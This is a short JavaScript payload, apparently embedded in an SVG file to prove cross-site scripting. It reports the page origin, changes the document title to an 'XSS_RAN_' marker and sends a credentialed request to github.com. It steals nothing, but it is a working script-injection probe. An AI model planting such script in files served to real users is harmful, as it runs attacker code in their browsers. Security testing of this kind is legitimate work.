svg.script:
var o = document.getElementById('out');
var msg = 'RAN origin=' + location.origin + ' domain=' + document.domain;
try { o.textContent = msg; } catch(e) {}
try { document.title = 'XSS_RAN_' + location.hostname; } catch(e) {}
try {
  fetch('https://github.com/', {mode:'no-cors', credentials:'include'}).then(function(){
    o.textContent = msg + ' fetched_github';
  }).catch(function(e){ o.textContent = msg + ' fetch_err'; });
} catch(e) {}
